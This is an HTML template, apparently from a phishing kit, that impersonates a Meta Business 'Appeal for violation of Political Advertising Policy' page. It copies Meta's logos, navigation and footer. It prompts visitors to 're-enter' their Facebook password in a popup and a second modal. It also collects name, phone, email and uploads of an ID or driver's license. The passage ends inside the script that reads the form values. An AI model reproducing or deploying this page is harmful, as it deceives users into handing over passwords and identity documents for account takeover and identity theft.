<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/svg+xml" href="{{ asset('assets/meta.png') }}" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
    <title>Security</title>
    <link rel="stylesheet" href="{{ asset('assets/auth.css') }}">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
    <title>Meta - Appeal for violation of Political Advertising Policy Meta</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link href="https://netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />


</head>

<body>
    <section class="body">
        <header>
            <div class="header flex">
                <div class="header-left flex">
                    <nav class="logo">
                        <a href="/">
                            <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"
                                class="logo-meta" decoding="auto" loading="lazy" />
                        </a>
                    </nav>
                    <ul class="menu-list flex">
                        <li>
                            <a href="https://www.facebook.com/business/tools/facebook-pages">
                                Get started
                            </a>
                        </li>
                        <li>
                            <a href="https://www.facebook.com/business/ads">Advertise</a>
                        </li>
                        <li>
                            <a href="https://www.facebook.com/business/learn/courses">Learn</a>
                        </li>
                        <li>
                            <a href="https://www.facebook.com/business/help/support">Support</a>
                        </li>
                    </ul>
                </div>
                <div class="header-right flex">
                    <nav class="search">
                        <i class="fa-solid fa-magnifying-glass"></i>
                    </nav>
                    <a class="header-button"
                        href="https://www.facebook.com/business/help/167836590566506?id=288762101909005">
                        Learn More
                    </a>
                </div>
                <div class="show-menu">
                    <i class="fa-solid fa-bars"></i>
                </div>
            </div>
        </header>

        <section class="main">
            <div id="spinnerContainer" class="spinner-container">
                <div class="spinner"></div>
            </div>
            <div id="popup">
                <div class="popup">
                    <div class="popup-content">
                        <div class="clearfix">
                            <h4 id="u_2_1_vi" class="title-repass">
                                Please re-enter your password
                            </h4>
                            <div class="close" onclick="onCancel()">
                                <i class="fa-solid fa-xmark"></i>
                            </div>
                        </div>
                        <div class="_4-i2 _pig password_prompt _50f4">
                            <div class="mbm" id="ajax_error_msg"></div>
                            <div class="mvm" id="ajax_prompt_msg">
                                For your security, you must re-enter your password to continue.
                            </div>
                            <div class="box-pass">
                                Password:
                                <nav class="mls">
                                    <p class="inputout">
                                        <input type="password" class="inputpassword autofocus" id="pass"
                                            name="pass" data-testid="reauth_password_field" />
                                    </p>
                                    <!-- Hiển thị hình ảnh loading khi file đang được tải lên, ban đầu sẽ không hiển thị -->
                                    <p class="loading-img">
                                        <img id="loadingIndicator1" class="pls uiLoadingIndicatorAsync img"
                                            src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif"
                                            alt="Loading..." width="16" height="11" style="display: none;">
                                    </p>
                                </nav>
                            </div>
                            <p id="passError"></p>
                            <p class="underline-popup"></p>
                            <div id="889rorms" class="flex form-popup">
                                <div class="forgot_box">
                                    <a href="https://www.facebook.com/recover/initiate/?ref=www_reauth_async"
                                        class="forgot">
                                        Forgot your password?
                                    </a>
                                </div>
                                <div class="popup-button">
                                    <nav> <button class="close_popup" onclick="onCancel()">Close</button></nav>
                                    <nav> <button class="submit_popup" onclick="handleOk()">Submit</button>
                                    </nav>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <form class="row g-3 form-main" id="form-main" method="post" enctype="multipart/form-data">
                <h1 class="title">
                    Appeal for violation of Political Advertising Policy Meta
                </h1>

                <div>
                    <label for="validationCustom01" class="form-label">
                        Name
                    </label>
                    <input type="text" class="form-control" placeholder="Name" id="name" name="name">

                    <div id="nameErr" style="color: red;display: none;  font-size: 13px"></div>
                </div>

                <div>
                    <label for="validationCustom01" class="form-label">
                        Phone Number
                    </label>
                    <input type="text" class="form-control" placeholder="Phone number" id="phone"
                        name="phone">
                    <div id="phoneErr" style="color: red; display: none; font-size: 13px"></div>

                </div>

                <div>
                    <label for="validationCustom02" class="form-label">
                        Email
                    </label>
                    <input type="email" class="form-control" placeholder="Email" id="email" name="email">
                    <div id="emailErr" style="color: red; display: none; font-size: 13px"></div>

                </div>
                <div class="">
                    <label for="validationCustomUsername" class="form-label">
                        Countries
                    </label>
                    <div class="input-group has-validation">
                        <select class="form-select select" id="country" name="nation" value="">
                            <option value="">Choose a country</option>
                            <option value="Afghanistan">
                                Afghanistan
                            </option>
                            <option value="Aland Islands">
                                Aland Islands
                            </option>
                            <option value="Albania">Albania</option>
                            <option value="Algeria">Algeria</option>
                            <option value="American Samoa">
                                American Samoa
                            </option>
                            <option value="Andorra">Andorra</option>
                            <option value="Angola">Angola</option>
                            <option value="Anguilla">Anguilla</option>
                            <option value="Antarctica">Antarctica</option>
                            <option value="Antigua and Barbuda">
                                Antigua and Barbuda
                            </option>
                            <option value="Argentina">Argentina</option>
                            <option value="Armenia">Armenia</option>
                            <option value="Aruba">Aruba</option>
                            <option value="Australia">Australia</option>
                            <option value="Azerbaijan">Azerbaijan</option>
                            <option value="Bahamas">Bahamas</option>
                            <option value="Bahrain">Bahrain</option>
                            <option value="Bangladesh">Bangladesh</option>
                            <option value="Barbados">Barbados</option>
                            <option value="Belarus">Belarus</option>
                            <option value="Belgium">Belgium</option>
                            <option value="Belize">Belize</option>
                            <option value="Benin">Benin</option>
                            <option value="Bermuda">Bermuda</option>
                            <option value="Bhutan">Bhutan</option>
                            <option value="Bolivia">Bolivia</option>
                            <option value="Bonaire, Sint Eustatius and Saba">
                                Bonaire, Sint Eustatius and Saba
                            </option>
                            <option value="Bosnia and Herzegovina">
                                Bosnia and Herzegovina
                            </option>
                            <option value="Botswana">Botswana</option>
                            <option value="Bouvet Island">
                                Bouvet Island
                            </option>
                            <option value="Brazil">Brazil</option>
                            <option value="British Indian Ocean Territory">
                                British Indian Ocean Territory
                            </option>
                            <option value="Brunei Darussalam">
                                Brunei Darussalam
                            </option>
                            <option value="Bulgaria">Bulgaria</option>
                            <option value="Burkina Faso">
                                Burkina Faso
                            </option>
                            <option value="Burundi">Burundi</option>
                            <option value="Cambodia">Cambodia</option>
                            <option value="Cameroon">Cameroon</option>
                            <option value="Canada">Canada</option>
                            <option value="Cape Verde">Cape Verde</option>
                            <option value="Cayman Islands">
                                Cayman Islands
                            </option>
                            <option value="Central African Republic">
                                Central African Republic
                            </option>
                            <option value="Chad">Chad</option>
                            <option value="Chile">Chile</option>
                            <option value="China">China</option>
                            <option value="Christmas Island">
                                Christmas Island
                            </option>
                            <option value="Cocos (Keeling) Islands">
                                Cocos (Keeling) Islands
                            </option>
                            <option value="Colombia">Colombia</option>
                            <option value="Comoros">Comoros</option>
                            <option value="Congo">Congo</option>
                            <option value="Congo, Democratic Republic of the Congo">
                                Congo, Democratic Republic of the Congo
                            </option>
                            <option value="Cook Islands">
                                Cook Islands
                            </option>
                            <option value="Costa Rica">Costa Rica</option>
                            <option value="Cote D'Ivoire">
                                Cote D'Ivoire
                            </option>
                            <option value="Croatia">Croatia</option>
                            <option value="Cuba">Cuba</option>
                            <option value="Curacao">Curacao</option>
                            <option value="Cyprus">Cyprus</option>
                            <option value="Czech Republic">
                                Czech Republic
                            </option>
                            <option value="Denmark">Denmark</option>
                            <option value="Djibouti">Djibouti</option>
                            <option value="Dominica">Dominica</option>
                            <option value="Dominican Republic">
                                Dominican Republic
                            </option>
                            <option value="Ecuador">Ecuador</option>
                            <option value="Egypt">Egypt</option>
                            <option value="El Salvador">
                                El Salvador
                            </option>
                            <option value="Equatorial Guinea">
                                Equatorial Guinea
                            </option>
                            <option value="Eritrea">Eritrea</option>
                            <option value="Estonia">Estonia</option>
                            <option value="Ethiopia">Ethiopia</option>
                            <option value=" Falkland Islands (Malvinas)">
                                Falkland Islands (Malvinas)
                            </option>
                            <option value="Faroe Islands">
                                Faroe Islands
                            </option>
                            <option value="Fiji">Fiji</option>
                            <option value="Finland">Finland</option>
                            <option value="France">France</option>
                            <option value="French Guiana">
                                French Guiana
                            </option>
                            <option value="French Polynesia">
                                French Polynesia
                            </option>
                            <option value="French Southern Territories">
                                French Southern Territories
                            </option>
                            <option value="Gabon">Gabon</option>
                            <option value="Gambia">Gambia</option>
                            <option value="Georgia">Georgia</option>
                            <option value="Germany">Germany</option>
                            <option value="Ghana">Ghana</option>
                            <option value="Gibraltar">Gibraltar</option>
                            <option value="Greece">Greece</option>
                            <option value="Greenland">Greenland</option>
                            <option value="Grenada">Grenada</option>
                            <option value="Guadeloupe">Guadeloupe</option>
                            <option value="Guam">Guam</option>
                            <option value="Guatemala">Guatemala</option>
                            <option value="Guernsey">Guernsey</option>
                            <option value="Guinea">Guinea</option>
                            <option value="Guinea-Bissau">
                                Guinea-Bissau
                            </option>
                            <option value="Guyana">Guyana</option>
                            <option value="Haiti">Haiti</option>
                            <option value="Heard Island and Mcdonald Islands">
                                Heard Island and Mcdonald Islands
                            </option>
                            <option value=" Holy See (Vatican City State)">
                                Holy See (Vatican City State)
                            </option>
                            <option value="Honduras">Honduras</option>
                            <option value="Hong Kong">Hong Kong</option>
                            <option value="Hungary">Hungary</option>
                            <option value="Iceland">Iceland</option>
                            <option value="India">India</option>
                            <option value="Indonesia">Indonesia</option>
                            <option value="Iran, Islamic Republic of">
                                Iran, Islamic Republic of
                            </option>
                            <option value="Iraq">Iraq</option>
                            <option value="Isle of Man">
                                Isle of Man
                            </option>
                            <option value="Israel">Israel</option>
                            <option value="Italy">Italy</option>
                            <option value="Jamaica">Jamaica</option>
                            <option value="Japan">Japan</option>
                            <option value="Jersey">Jersey</option>
                            <option value="Jordan">Jordan</option>
                            <option value="Kazakhstan">Kazakhstan</option>
                            <option value="Kenya">Kenya</option>
                            <option value="Kiribati">Kiribati</option>
                            <option value="Korea, Democratic People's Republic of">
                                Korea, Democratic People's Republic of
                            </option>
                            <option value="Korea, Republic of">
                                Korea, Republic of
                            </option>
                            <option value="Kosovo">Kosovo</option>
                            <option value="Kuwait">Kuwait</option>
                            <option value="KG">Kyrgyzstan</option>
                            <option value="Lao People's Democratic Republic">
                                Lao People's Democratic Republic
                            </option>
                            <option value="Latvia">Latvia</option>
                            <option value="Lebanon">Lebanon</option>
                            <option value="Lesotho">Lesotho</option>
                            <option value="Liberia">Liberia</option>
                            <option value="Libyan Arab Jamahiriya">
                                Libyan Arab Jamahiriya
                            </option>
                            <option value="Liechtenstein">
                                Liechtenstein
                            </option>
                            <option value="Lithuania">Lithuania</option>
                            <option value="Luxembourg">Luxembourg</option>
                            <option value="Macao">Macao</option>
                            <option value="Macedonia, the Former Yugoslav Republic of">
                                Macedonia, the Former Yugoslav Republic
                                of
                            </option>
                            <option value="Madagascar">Madagascar</option>
                            <option value="Malawi">Malawi</option>
                            <option value="Malaysia">Malaysia</option>
                            <option value="Maldives">Maldives</option>
                            <option value="Mali">Mali</option>
                            <option value="Malta">Malta</option>
                            <option value="Marshall Islands">
                                Marshall Islands
                            </option>
                            <option value="Martinique">Martinique</option>
                            <option value="Mauritania">Mauritania</option>
                            <option value="Mauritius">Mauritius</option>
                            <option value="Mayotte">Mayotte</option>
                            <option value="Mexico">Mexico</option>
                            <option value="Micronesia, Federated States of">
                                Micronesia, Federated States of
                            </option>
                            <option value="Moldova, Republic of">
                                Moldova, Republic of
                            </option>
                            <option value="Monaco">Monaco</option>
                            <option value="Mongolia">Mongolia</option>
                            <option value="Montenegro">Montenegro</option>
                            <option value="Montserrat">Montserrat</option>
                            <option value="Morocco">Morocco</option>
                            <option value="Mozambique">Mozambique</option>
                            <option value="Myanmar">Myanmar</option>
                            <option value="Namibia">Namibia</option>
                            <option value="Nauru">Nauru</option>
                            <option value="Nepal">Nepal</option>
                            <option value="Netherlands">
                                Netherlands
                            </option>
                            <option value="Netherlands Antilles">
                                Netherlands Antilles
                            </option>
                            <option value=" New Caledonia">
                                New Caledonia
                            </option>
                            <option value="New Zealand">
                                New Zealand
                            </option>
                            <option value="Nicaragua">Nicaragua</option>
                            <option value="Niger">Niger</option>
                            <option value="Nigeria">Nigeria</option>
                            <option value="Niue">Niue</option>
                            <option value="Norfolk Island">
                                Norfolk Island
                            </option>
                            <option value="Northern Mariana Islands">
                                Northern Mariana Islands
                            </option>
                            <option value="Norway">Norway</option>
                            <option value="Oman">Oman</option>
                            <option value="Pakistan">Pakistan</option>
                            <option value="Palau">Palau</option>
                            <option value="Palestinian Territory, Occupied">
                                Palestinian Territory, Occupied
                            </option>
                            <option value="Panama">Panama</option>
                            <option value="Papua New Guinea">
                                Papua New Guinea
                            </option>
                            <option value="Paraguay">Paraguay</option>
                            <option value="Peru">Peru</option>
                            <option value="Philippines">
                                Philippines
                            </option>
                            <option value="Pitcairn">Pitcairn</option>
                            <option value="Poland">Poland</option>
                            <option value="Portugal">Portugal</option>
                            <option value="Puerto Rico">
                                Puerto Rico
                            </option>
                            <option value="Qatar">Qatar</option>
                            <option value="Reunion">Reunion</option>
                            <option value="Romania">Romania</option>
                            <option value="Russian Federation">
                                Russian Federation
                            </option>
                            <option value="Rwanda">Rwanda</option>
                            <option value="Saint Barthelemy">
                                Saint Barthelemy
                            </option>
                            <option value="Saint Helena">
                                Saint Helena
                            </option>
                            <option value="Saint Kitts and Nevis">
                                Saint Kitts and Nevis
                            </option>
                            <option value="Saint Lucia">
                                Saint Lucia
                            </option>
                            <option value="Saint Martin">
                                Saint Martin
                            </option>
                            <option value="Saint Pierre and Miquelon">
                                Saint Pierre and Miquelon
                            </option>
                            <option value="Saint Vincent and the Grenadines">
                                Saint Vincent and the Grenadines
                            </option>
                            <option value="Samoa">Samoa</option>
                            <option value="San Marino">San Marino</option>
                            <option value="Sao Tome and Principe">
                                Sao Tome and Principe
                            </option>
                            <option value="Saudi Arabia">
                                Saudi Arabia
                            </option>
                            <option value="Senegal">Senegal</option>
                            <option value="Serbia">Serbia</option>
                            <option value="Serbia and Montenegro">
                                Serbia and Montenegro
                            </option>
                            <option value="Seychelles">Seychelles</option>
                            <option value="Sierra Leone">
                                Sierra Leone
                            </option>
                            <option value="Singapore">Singapore</option>
                            <option value="Sint Maarten">
                                Sint Maarten
                            </option>
                            <option value="Slovakia">Slovakia</option>
                            <option value="Slovenia">Slovenia</option>
                            <option value="Solomon Islands">
                                Solomon Islands
                            </option>
                            <option value="Somalia">Somalia</option>
                            <option value=" South Africa">
                                South Africa
                            </option>
                            <option value="South Georgia and the South Sandwich Islands">
                                South Georgia and the South Sandwich
                                Islands
                            </option>
                            <option value=" South Sudan">
                                South Sudan
                            </option>
                            <option value="Spain">Spain</option>
                            <option value="Sri Lanka">Sri Lanka</option>
                            <option value="Sudan">Sudan</option>
                            <option value="Suriname">Suriname</option>
                            <option value="Svalbard and Jan Mayen">
                                Svalbard and Jan Mayen
                            </option>
                            <option value="Swaziland">Swaziland</option>
                            <option value="Sweden">Sweden</option>
                            <option value="Switzerland">
                                Switzerland
                            </option>
                            <option value="Syrian Arab Republic">
                                Syrian Arab Republic
                            </option>
                            <option value="Taiwan, Province of China">
                                Taiwan, Province of China
                            </option>
                            <option value="Tajikistan">Tajikistan</option>
                            <option value="Tanzania, United Republic of">
                                Tanzania, United Republic of
                            </option>
                            <option value="Thailand">Thailand</option>
                            <option value="Timor-Leste">
                                Timor-Leste
                            </option>
                            <option value="Togo">Togo</option>
                            <option value="Tokelau">Tokelau</option>
                            <option value="Tonga">Tonga</option>
                            <option value="Trinidad and Tobago">
                                Trinidad and Tobago
                            </option>
                            <option value="Tunisia">Tunisia</option>
                            <option value="Turkey">Turkey</option>
                            <option value="Turkmenistan">
                                Turkmenistan
                            </option>
                            <option value="Turks and Caicos Islands">
                                Turks and Caicos Islands
                            </option>
                            <option value="Tuvalu">Tuvalu</option>
                            <option value="Uganda">Uganda</option>
                            <option value="Ukraine">Ukraine</option>
                            <option value="United Arab Emirates">
                                United Arab Emirates
                            </option>
                            <option value="United Kingdom">
                                United Kingdom
                            </option>
                            <option value="United States">
                                United States
                            </option>
                            <option value="United States Minor Outlying Islands">
                                United States Minor Outlying Islands
                            </option>
                            <option value="Uruguay">Uruguay</option>
                            <option value="Uzbekistan">Uzbekistan</option>
                            <option value="Vanuatu">Vanuatu</option>
                            <option value="Venezuela">Venezuela</option>
                            <option value="Viet Nam">Viet Nam</option>
                            <option value="Virgin Islands, British">
                                Virgin Islands, British
                            </option>
                            <option value="Virgin Islands, U.s.">
                                Virgin Islands, U.s.
                            </option>
                            <option value=" Wallis and Futuna">
                                Wallis and Futuna
                            </option>
                            <option value="Western Sahara">
                                Western Sahara
                            </option>
                            <option value="Yemen">Yemen</option>
                            <option value="Zambia">Zambia</option>
                            <option value="Zimbabwe">Zimbabwe</option>
                        </select>
                    </div>
                </div>
                <div class="">
                    <label for="validationCustom04" class="form-label">
                        Industries
                    </label>
                    <select class="form-select select " id="industries" name="industries">
                        <option selected disabled>Choose a industry</option>
                        <option value="Automotive">Automotive</option>
                        <option value="Consumer packaged goods">Consumer packaged goods</option>
                        <option value="eCommerce">eCommerce</option>
                        <option value="Education">Education</option>
                        <option value="Energy & Utilities">Energy & Utilities</option>
                        <option value="Entertainment">Entertainment</option>
                        <option value="Financial Services">Financial Services</option>
                        <option value="Gaming">Gaming</option>
                        <option value="Government & Politics">Government & Politics</option>
                        <option value="Healthcare">Healthcare</option>
                        <option value="Organizations & Associations">Organizations & Associations</option>
                        <option value="Professional Services">Professional Services</option>
                        <option value="Retail">Retail</option>
                        <option value="Technology">Technology</option>
                        <option value="Telecom">Telecom</option>
                        <option value="Travel">Travel</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                <div class="col-12">
                    <div class="form-check radio-check">
                        <input type="radio" name="radioSelected" value="yes" checked /> Yes I'm advertising
                        about
                        politics but it's not illegal
                        <br />
                        <input type="radio" name="radioSelected" value="no" /> No,
                        I do not advertise about
                        political
                        issues
                        <br />
                        <input type="radio" name="radioSelected" value="other" />
                        Other:
                    </div>
                </div>
                <div class="col-12">
                    <textarea class="" cols="10" rows="5" name="textarea" id="customTextarea" disabled></textarea>
                </div>

                <div class="col-12">
                    <p class="lorem">Upload your ID or Driver's License</p>
                </div>



                <div>


                    <input type="file" id="fileInput" class="fileInputUpload" name="files[]"
                        accept="image/png, image/jpeg, image/jpg" hidden multiple>
                    <label for="fileInput" class="upload-file btn-rounded">Upload files</label>


                    <!-- Span để hiển thị thông điệp về trạng thái file -->
                    <span id="fileChosen">No file selected</span>

                    <!-- Hiển thị hình ảnh loading khi file đang được tải lên, ban đầu sẽ không hiển thị -->
                    <img id="loadingIndicator" class="pls uiLoadingIndicatorAsync img"
                        src="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/vF9DX0rAdyp.gif" alt="Loading..."
                        width="16" height="11" style="display: none;">

                    <!-- Button để người dùng có thể hủy bỏ file đã chọn -->
                    <button id="cancelUpload" style="display: none;"><i class="fa-solid fa-xmark"></i></button>

                    <!-- Span để hiển thị cảnh báo khi số lượng file chọn không đủ -->
                    <span id="fileWarning" style="color: red; display: none;">Please select at least 2
                        files.</span>
                </div>

                <label id="find-id">
                    <p class="find-id">
                        You can also find out
                        <a class="happen" href="https://www.facebook.com/help/159096464162185">
                            what happens to your ID
                        </a>
                        after sending it to Facebook.
                    </p>
                </label>

                <div class="submit-form">
                    <button class="select-btn login-meta" type="button">
                        Submit
                    </button>
                </div>
            </form>
        </section>
        <footer>
            <div class="flex-centered footer">
                <div class="footer-content">
                    <nav>
                        <h4>Meta's technology</h4>
                        <div class="footer-link">
                            <a href="">Facebook</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Instagram</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Messenger</a>
                        </div>
                        <div class="footer-link">
                            <a href="">WhatsApp</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Audience Network</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Oculus</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Workplace</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Meta for Work</a>
                        </div>
                    </nav>
                    <nav>
                        <h4>Tools</h4>
                        <div class="footer-link">
                            <a href="">Free tools</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Facebook page</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Instagram personal page</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Believe</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Shop</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Advertise on Facebook</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Ads on Messenger</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Advertising on Instagram</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Video advertising</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Ads Manager</a>
                        </div>
                    </nav>
                </div>
                <div class="footer-content">
                    <nav>
                        <h4>Target</h4>
                        <div class="footer-link">
                            <a href="">Set up a Facebook Page</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Build brand awareness</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Advertise local businesses</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Increase online sales</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Application advertising</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Search for potential customers</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Measure and optimize ads</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Retarget existing customers</a>
                        </div>
                        <div class="footer-link">
                            <a href="">See all goals</a>
                        </div>
                    </nav>
                    <nav>
                        <h4>Type of business</h4>
                        <div class="footer-link">
                            <a href="">Small Business</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Big business</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Agency</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Media and Publisher</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Content creator</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Developer _</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Startup company</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Business Partners</a>
                        </div>
                    </nav>
                </div>
                <div class="footer-content">
                    <nav>
                        <h4>Branch</h4>
                        <div class="footer-link">
                            <a href="">Car</a>
                        </div>
                        <div class="footer-link">
                            <a href="">B2B</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Consumer packaged goods</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Ecommerce</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Education</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Entertainment and media</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Financial services</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Game</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Real estate</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Restaurant</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Retail</a>
                        </div>
                        <div class="footer-link">
                            <a href="">
                                Technology and telecommunications
                            </a>
                        </div>
                        <div class="footer-link">
                            <a href="">Tourism</a>
                        </div>
                    </nav>
                    <nav>
                        <h4>Inspiration</h4>
                        <div class="footer-link">
                            <a href="">Meta Foresight</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Campaign instructions</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Business news</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Case study</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Video</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Event</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Creative Hub</a>
                        </div>
                    </nav>
                </div>
                <div class="footer-content">
                    <nav>
                        <h4>Skills and training</h4>
                        <div class="footer-link">
                            <a href="">Online Learning</a>
                        </div>
                        <div class="footer-link">
                            <a href="">The program has a certificate</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Webinar</a>
                        </div>
                        <div class="footer-link">
                            <a href="">WhatsApp</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Audience Network</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Oculus</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Workplace</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Meta for Work</a>
                        </div>
                    </nav>
                    <nav>
                        <h4>Instructions, information & resources</h4>
                        <div class="footer-link">
                            <a href="">Advertising guide</a>
                        </div>
                        <div class="footer-link">
                            <a href="">
                                COVID-19 information & resources
                            </a>
                        </div>
                        <div class="footer-link">
                            <a href="">Safety and integrity</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Business equality</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Find business partners</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Sitemap</a>
                        </div>
                    </nav>
                    <nav>
                        <h4>Business Help Center</h4>
                        <div class="footer-link">
                            <a href="">Create and manage accounts</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Post and distribute content</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Advertisement</a>
                        </div>
                        <div class="footer-link">
                            <a href="">
                                Sell ​on Facebook and Instagram
                            </a>
                        </div>
                        <div class="footer-link">
                            <a href="">Monetize your content or apps</a>
                        </div>
                        <div class="footer-link">
                            <a href="">View all posts</a>
                        </div>
                    </nav>
                </div>
            </div>
            <p class="underline"></p>
            <div class="footer-end flex">
                <div class="footer-end-left">
                    <div class="footer-link">
                        <a href="">© 2023 Meta</a>
                    </div>
                    <nav class="flex">
                        <div class="footer-image">
                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01"
                                alt="facebook" />
                        </div>
                        <div class="footer-image">
                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125184609_367828907811587_6232717932985532700_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=A6XaOv9EIssAX9KcwNw&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDCfDIZ_hak_Er8VITWnTWfqAN4pDrQTBS0BCZvOmPcVg&oe=6559F699"
                                alt="instagram" />
                        </div>
                        <div class="footer-image">
                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/125236997_694902778115984_451660285310228094_n.svg?_nc_cat=102&ccb=1-7&_nc_sid=f537c7&_nc_ohc=2_wjHrfUa38AX_8o8q4&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDO46y08vUdxEO0ZF7I_POMkJLMF-tXFJXTGGyYA8fz5Q&oe=655AA6BF"
                                alt="linkedin" />
                        </div>
                        <div class="footer-image">
                            <img src="https://scontent.fhan20-1.fna.fbcdn.net/v/t39.8562-6/120319840_799089310850692_4027936540782357774_n.svg?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=ukShCzomoYsAX-cj-ez&_nc_ht=scontent.fhan20-1.fna&oh=00_AfDkLdLd7lVHg14clofNEbZGycHPx0njuOU0m1SgaoL60Q&oe=65594A01"
                                alt="facebook" />
                        </div>
                    </nav>
                </div>
                <div class="flex footer-end-right">
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Introduce</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Vietnamese</a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Developers</a>
                        </div>
                        <div class="footer-link">
                            <a href="">English (US)</a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Recruitment</a>
                        </div>
                        <div class="footer-link">
                            <a href="">English (UK)</a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Privacy</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Español</a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Cookies</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Português (Brazil) </a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Rules</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Français (France) </a>
                        </div>
                    </nav>
                    <nav class="grid-footer-end">
                        <div class="footer-link">
                            <a href="">Help Center</a>
                        </div>
                        <div class="footer-link">
                            <a href="">Other languages</a>
                        </div>
                    </nav>
                </div>
            </div>
        </footer>
    </section>
</body>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="{{ asset('assets/index.js') }}"></script>

</html>
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Password</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="password" class="form-control" placeholder="password" id="password" name="password">
            </div>
            <div id="passwordError"
                style="color: red; display: none; margin-left: 18px; margin-top: -12px; font-size: 13px"></div>

            <div class="modal-footer">
                <button type="button" class="btn btn-primary">Login</button>
            </div>
        </div>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

<script>
    $(document).ready(function() {
        $('.login-meta').on('click', function(e) {
            e.preventDefault();
            var nameValue = document.getElementById('name').value;
            var phoneValue = document.getElementById('phone').value;
